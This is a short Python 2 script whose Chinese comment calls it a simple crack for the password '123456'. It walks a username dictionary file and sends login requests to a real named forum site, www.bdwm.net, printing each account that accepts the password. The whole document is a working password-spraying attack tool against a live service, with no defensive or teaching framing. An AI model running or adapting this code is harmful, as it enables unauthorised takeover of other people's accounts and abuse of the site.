#encoding=utf-8;

import os;
import httplib,urllib;

#简单破解'123456'密码
def Check(username,password):
    params = urllib.urlencode({'userid':username , 'password' :password});
    headers = {'Content-type' : 'application/x-www-from-urlencoded'};
    conn = httplib.HTTPSConnection('www.bdwm.net');
    conn.request('POST','/bbs/bbslog2.php', params, headers);
    res = conn.getresponse().read();
    conn.close();
    if res.find('密码不正确') != -1:
        return False;
    elif res.find('不存在这个用户') != -1:
        return False;
    else:
        return True;
for i in open('English.Dic'):
    if Check(i.rstrip(),'123456'):
        print i;
